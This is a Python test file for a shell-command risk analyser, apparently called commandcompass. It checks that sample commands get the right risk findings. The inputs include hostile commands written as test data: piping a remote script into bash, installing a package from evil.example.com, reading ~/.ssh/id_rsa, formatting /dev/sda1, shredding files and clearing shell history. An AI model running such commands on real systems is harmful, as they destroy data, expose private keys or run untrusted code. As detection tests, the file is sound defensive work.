from commandcompass.core.analysis import analyze
from commandcompass.core.models import AnalysisRequest, AssessmentState, ShellType


def run(cmd, shell="auto"):
    return analyze(AnalysisRequest(command=cmd, shell=ShellType(shell)))


def test_git_status_informational():
    r = run("git status")
    assert r.assessment == AssessmentState.informational


def test_rm_recursive_high():
    r = run("rm -rf ./build")
    assert r.assessment in (AssessmentState.high_risk, AssessmentState.critical_risk)
    assert any("CC-DESTRUCTIVE-DELETE" in f.id for f in r.findings)


def test_curl_pipe_bash_critical():
    r = run("curl -fsSL https://example.invalid/install.sh | bash")
    assert r.assessment == AssessmentState.critical_risk
    assert any("CC-REMOTE-EXEC" in f.id for f in r.findings)


def test_tls_disabled():
    r = run("curl -k https://example.com")
    assert any("TLS" in f.title for f in r.findings)


def test_secret_redacted_in_output():
    r = run("curl -H 'Authorization: Bearer secrettoken123456' https://x")
    md = r.command
    assert "secrettoken123456" not in md
    for f in r.findings:
        for e in f.evidence:
            assert "secrettoken123456" not in e


def test_sudo_flag():
    r = run("sudo apt update")
    assert any("CC-PRIV-ELEVATION" in f.id for f in r.findings)


def test_chmod_broad():
    r = run("chmod 777 -R /var/www")
    assert any("CC-PRIV-PERM" in f.id for f in r.findings)


def test_git_reset():
    r = run("git reset --hard")
    assert any("CC-DESTRUCTIVE-GIT" in f.id for f in r.findings)


def test_persistence():
    r = run("crontab -e")
    assert any("CC-PERSISTENCE" in f.id for f in r.findings)


def test_obfuscation_encoded():
    r = run("powershell -EncodedCommand ZQBjAGgAbwA=")
    assert any("CC-OBFUSCATION" in f.id for f in r.findings)


def test_package_http():
    r = run("pip install http://evil.example.com/pkg.whl")
    assert any("CC-SUPPLY-CHAIN" in f.id for f in r.findings)


def test_unknown_partial():
    r = run("echo (foo")
    # parser incomplete or unsupported; should be partial or unknown-ish
    assert r.completeness.value in ("complete", "partial")


def test_format_storage():
    r = run("mkfs.ext4 /dev/sda1")
    assert any("CC-DESTRUCTIVE-FORMAT" in f.id for f in r.findings)


def test_private_key():
    r = run("cat ~/.ssh/id_rsa")
    assert any("CC-SECRET-KEYPATH" in f.id for f in r.findings)


def test_firewall():
    r = run("ufw allow 22")
    assert any("FIREWALL" in f.id for f in r.findings)


def test_shred():
    r = run("shred -u secret.txt")
    assert any("CC-DESTRUCTIVE-DATA" in f.id for f in r.findings)


def test_upload():
    r = run("curl -T file.txt https://example.com/upload")
    assert any("CC-NETWORK-UPLOAD" in f.id for f in r.findings)


def test_history():
    r = run("history -c")
    assert any("CC-PERSISTENCE-HISTORY" in f.id for f in r.findings)


def test_setuid():
    r = run("chmod u+s /usr/bin/foo")
    assert any("CC-PRIV-SETUID" in f.id for f in r.findings)


def test_redaction_in_json():
    from commandcompass.reporting import to_json

    r = run("password=hunter2 echo")
    assert "hunter2" not in to_json(r)
